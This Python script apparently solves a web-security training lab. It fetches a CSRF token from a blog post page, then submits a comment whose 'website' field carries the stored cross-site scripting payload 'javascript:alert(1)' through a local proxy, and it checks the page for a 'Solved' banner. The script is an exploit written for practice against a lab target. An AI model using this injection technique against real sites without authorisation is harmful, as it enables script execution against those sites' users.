#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup

def getCSRF(url):
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    s = requests.Session()
    r = s.get(url + 'post?postId=2', headers=headers)
    p = BeautifulSoup(r.content, "html.parser")

    csrf = p.find(attrs = {'name' : 'csrf'})['value']
    
    return {'s': s, 'csrf': csrf} 

def xssStored(url, csrf_session, csrf_token):
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    proxies = {
        'http': 'http://127.0.0.1:8080',
    }

    payload = "javascript:alert(1)"

    print(csrf_token)

    data = {
        'csrf': csrf_token,
        'postId': '2',
        'comment': "test",
        'name': 'test',
        'email': 'test@test',
        'website': payload,
    }

    r = csrf_session.post(url + 'post/comment', proxies=proxies, headers=headers, data=data)
    print(r.status_code)

    r2 = csrf_session.get(url + 'post?postId=2', proxies=proxies, headers=headers)
    
    if "Solved" in r2.text:
        print(f"[INFO] Payload: {payload}")
        print("[INFO] Payload Successful")

if __name__ == '__main__':
    url = 'https://ac621f181f0f273dc0104a2500ef0068.web-security-academy.net/'

    csrf_req = getCSRF(url)
    csrf_session = csrf_req['s']
    csrf_token = csrf_req['csrf']
    xssStored(url, csrf_session, csrf_token)